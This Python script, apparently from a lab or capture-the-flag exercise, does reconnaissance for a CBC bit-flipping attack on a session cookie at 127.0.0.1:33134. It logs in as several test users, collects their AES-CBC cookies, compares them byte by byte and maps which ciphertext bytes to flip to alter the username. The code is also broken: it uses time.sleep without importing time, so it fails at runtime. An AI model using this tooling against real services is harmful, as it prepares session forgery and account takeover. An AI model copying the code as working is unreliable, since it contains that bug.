import requests
import socket
import sys

def diagnose_connectivity():
    """Check if target is reachable"""
    target_host = "127.0.0.1"
    target_port = 33134
    
    print("=" * 80)
    print("CONNECTIVITY DIAGNOSTICS")
    print("=" * 80)
    print(f"Target: {target_host}:{target_port}")
    print()
    
    # Test 1: TCP connection
    print("[Test 1] Checking TCP connectivity...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex((target_host, target_port))
    sock.close()
    
    if result == 0:
        print("    ✓ TCP port is OPEN")
    else:
        print(f"    ✗ TCP port is CLOSED or FILTERED (error code: {result})")
        print("    The service may not be running or may be on a different port")
        return False
    
    # Test 2: HTTP GET request
    print("\n[Test 2] Checking HTTP service availability...")
    try:
        response = requests.get(f"http://{target_host}:{target_port}/", timeout=10)
        print(f"    Status Code: {response.status_code}")
        print(f"    Response Length: {len(response.text)} bytes")
        if response.text:
            print(f"    Preview: {response.text[:200]}")
        print("\n[Headers]")
        for k, v in response.headers.items():
            print(f"    {k}: {v}")
    except requests.exceptions.ConnectionError as e:
        print(f"    ✗ Connection error: {e}")
        print("    The HTTP service may not be running properly")
        return False
    except requests.exceptions.Timeout:
        print("    ✗ Request timed out")
        return False
    except Exception as e:
        print(f"    ✗ Unexpected error: {e}")
        return False
    
    print("\n" + "=" * 80)
    print("SERVICE REACHABLE - Proceeding with cookie analysis")
    print("=" * 80)
    return True

def analyze_cookie_structure():
    """Main cookie analysis function"""
    
    if not diagnose_connectivity():
        print("\n[!] Aborting - Target service is not accessible")
        sys.exit(1)
    
    target_url = "http://127.0.0.1:33134"
    test_usernames = ["test1", "test2", "test3"]
    
    print("\n" + "=" * 80)
    print("COOKIE STRUCTURE ANALYSIS")
    print("=" * 80)
    print()
    
    collected_cookies = {}
    
    # Phase 1: Collect cookies
    print("[Phase 1] Collecting Session Cookies")
    print("-" * 80)
    
    for idx, username in enumerate(test_usernames, 1):
        print(f"\n[{idx}/{len(test_usernames)}] Login attempt: {username}")
        
        login_url = f"{target_url}/login"
        login_data = {
            "username": username,
            "password": "password"  # Using default/fixed password
        }
        
        try:
            # Post with redirects disabled to better capture cookies
            response = requests.post(
                login_url, 
                data=login_data, 
                timeout=10,
                allow_redirects=False
            )
            
            print(f"    Status: {response.status_code}")
            print(f"    Has cookies: {len(response.cookies) > 0}")
            
            # Method 1: Check response cookies
            session_from_cookies = response.cookies.get('session')
            if session_from_cookies:
                collected_cookies[username] = session_from_cookies
                print(f"    ✓ Cookie from jar: {session_from_cookies[:50]}...")
            
            # Method 2: Check Set-Cookie header
            set_cookie_header = response.headers.get('set-cookie', '')
            if set_cookie_header and 'session=' in set_cookie_header:
                session_from_header = None
                for cookie_part in set_cookie_header.split(','):
                    if 'session=' in cookie_part:
                        session_val = cookie_part.split('session=')[1].split(';')[0].strip()
                        session_from_header = session_val
                        break
                
                if session_from_header:
                    if username not in collected_cookies:
                        collected_cookies[username] = session_from_header
                        print(f"    ✓ Cookie from header: {session_from_header[:50]}...")
                    elif collected_cookies[username] != session_from_header:
                        print(f"    ⚠ Warning: Cookie mismatch!")
                        print(f"      Jar: {collected_cookies[username]}")
                        print(f"      Header: {session_from_header}")
            
            if username not in collected_cookies:
                print(f"    ✗ No session cookie found")
                if response.text:
                    print(f"    Response preview: {response.text[:200]}")
            
            # Be nice to the server
            time.sleep(0.5)
            
        except requests.exceptions.RequestException as e:
            print(f"    ✗ Request error: {e}")
            continue
    
    # Verify collection
    if len(collected_cookies) < 2:
        print("\n" + "=" * 80)
        print("[✗] ERROR: Insufficient cookies collected")
        print(f"Need: 2+ cookies, Got: {len(collected_cookies)}")
        print("=" * 80)
        sys.exit(1)
    
    # Phase 2: Analysis
    print("\n" + "=" * 80)
    print("[Phase 2] Cookie Analysis")
    print("=" * 80)
    
    print("\n[2.1] Cookie Samples (Hex Format)")
    print("-" * 80)
    for username in test_usernames:
        if username in collected_cookies:
            cookie = collected_cookies[username]
            print(f"{username:>8}: {cookie}")
            print(f"          Length: {len(cookie)} chars")
            if len(cookie) == 64:
                print(f"          Format: ✓ Valid AES-CBC (64 hex chars = 32 bytes)")
            else:
                print(f"          Format: ⚠ Unexpected length (expected 64)")
            print()
    
    # Convert to bytes
    print("[2.2] Hex to Bytes Conversion")
    print("-" * 80)
    byte_arrays = {}
    
    for username, cookie_hex in collected_cookies.items():
        try:
            byte_data = bytes.fromhex(cookie_hex)
            byte_arrays[username] = byte_data
            
            # Show formatted bytes
            formatted = ' '.join(f'{b:02x}' for b in byte_data)
            print(f"{username:>8}: {formatted}")
            print(f"          {len(byte_data)} bytes total")
            print()
        except Exception as e:
            print(f"{username:>8}: ✗ Error converting hex - {e}")
    
    # Byte comparison
    print("[2.3] Byte-by-Byte Comparison")
    print("-" * 80)
    
    reference_user = list(byte_arrays.keys())[0]
    reference_data = byte_arrays[reference_user]
    comparison_users = [u for u in test_usernames if u in byte_arrays and u != reference_user]
    
    # Header
    header = f"{'Byte':>4} | "
    for username in test_usernames:
        if username in byte_arrays:
            header += f"{username:>8} | "
    header += " Status"
    
    print(header)
    print("-" * 80)
    
    different_positions = []
    for i in range(len(reference_data)):
        line = f"{i:4} | "
        byte_values = []
        
        for username in test_usernames:
            if username in byte_arrays:
                byte_val = byte_arrays[username][i]
                line += f" 0x{byte_val:02x}   | "
                byte_values.append(byte_val)
        
        # Check if all same
        all_same = all(b == byte_values[0] for b in byte_values)
        
        if all_same:
            line += "   SAME"
        else:
            line += "   *DIFFERENT*"
            different_positions.append(i)
        
        print(line)
    
    print("-" * 80)
    print(f"\nTotal different bytes: {len(different_positions)}")
    print(f"Different positions: {different_positions}")
    
    # Block analysis
    print("\n[2.4] AES-CBC Block Analysis")
    print("-" * 80)
    
    BLOCK_SIZE = 16  # AES standard
    cookie_bytes = len(reference_data)
    num_blocks = cookie_bytes // BLOCK_SIZE
    
    print(f"Cookie size: {cookie_bytes} bytes")
    print(f"Block size: {BLOCK_SIZE} bytes")
    print(f"Total blocks: {num_blocks}")
    print()
    
    username_block_info = None
    
    for block_num in range(num_blocks):
        block_start = block_num * BLOCK_SIZE
        block_end = block_start + BLOCK_SIZE - 1
        
        # Find positions in this block that differ
        block_positions = [p for p in different_positions if block_start <= p <= block_end]
        
        print(f"Block {block_num} (bytes {block_start:2d}-{block_end:2d}):")
        
        if block_positions:
            print(f"  ✓ Contains username data")
            print(f"  ✓ Byte positions: {block_positions}")
            
            # Calculate offset within block
            offset_in_block = block_positions[0] - block_start
            username_length = len(block_positions)
            
            print(f"  ✓ Username starts at offset: {offset_in_block} (within block)")
            print(f"  ✓ Username occupies: {username_length} bytes")
            
            # Show the actual bytes
            for username in test_usernames[:2]:  # Show first 2 only
                if username in byte_arrays:
                    username_bytes = [byte_arrays[username][p] for p in block_positions]
                    hex_str = ' '.join(f'{b:02x}' for b in username_bytes)
                    print(f"  ✓ {username:8} bytes: {hex_str}")
            
            username_block_info = {
                'block_num': block_num,
                'offset': offset_in_block,
                'length': username_length,
                'positions': block_positions
            }
        else:
            print(f"  ✗ No username data (likely IV/padding/metadata)")
        
        print()
    
    # Summary
    print("=" * 80)
    print("[SUMMARY] Cookie Structure Mapping")
    print("=" * 80)
    print()
    
    if username_block_info:
        print("✅ USERNAME POSITION IDENTIFIED:")
        print(f"   - Username is in Block {username_block_info['block_num']}")
        print(f"   - Block range: bytes {username_block_info['block_num']*BLOCK_SIZE}-{username_block_info['block_num']*BLOCK_SIZE+BLOCK_SIZE-1}")
        print(f"   - Username offset within block: {username_block_info['offset']}")
        print(f"   - Username spans: {username_block_info['length']} bytes")
        print()
        print("✅ FOR CBC BIT FLIPPING ATTACK:")
        print(f"   - Target block to modify: Previous block (Block {username_block_info['block_num']-1})")
        print(f"   - Bit-flip positions in previous block: {username_block_info['positions']}")
        print("   - Flipping bits in previous block ciphertext will corrupt username in plaintext")
    
    print("\n" + "=" * 80)
    print("[!] Ready for CBC bit flipping exploit")
    print("=" * 80)
    
    return collected_cookies, username_block_info

if __name__ == "__main__":
    try:
        cookies, mapping = analyze_cookie_structure()
        print("\n✓ Analysis successful!")
    except Exception as e:
        print(f"\n✗ Analysis failed: {e}")
        sys.exit(1)
